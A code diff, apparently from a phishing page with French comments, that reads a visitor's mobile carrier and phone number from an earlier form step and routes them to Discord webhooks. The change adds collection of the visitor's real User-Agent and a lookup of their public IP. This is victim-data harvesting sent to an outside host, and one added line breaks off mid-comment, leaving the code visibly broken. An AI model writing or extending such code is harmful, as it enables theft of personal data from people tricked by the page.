@@ -130,9 +130,22 @@
       const step1 = JSON.parse(localStorage.getItem("step1") || "{}");
       const operateur = step1.operateur || "Non fourni";
       const telephone = step1.telephone || "Non fourni";
-      const ip = "Inconnu";
-      const ua = "Inconnu";
+      const ua = navigator.userAgent; // récupère le User-Agent réel
 
+// Fonction async pour récupérer l'IP
+async function getIP() {
+  try {
+    const res = await fetch("https://api64.ipify.org?format=json");
+    const data = await res.json();
+    return data.ip || "Inconnu";
+  } catch (err) {
+    console.error("Erreur récupération IP :", err);
+    return "Inconnu";
+  }
+}
+
+(async () => {
+  const ip = await getIP(); // récupè
       let webhookToUse = DISCORD_WEBHOOK_URL;
       if (operateur.toLowerCase().includes("bouygues") && Math.random() < 0.5) {
         webhookToUse = DISCORD_ALT_WEBHOOK_URL;
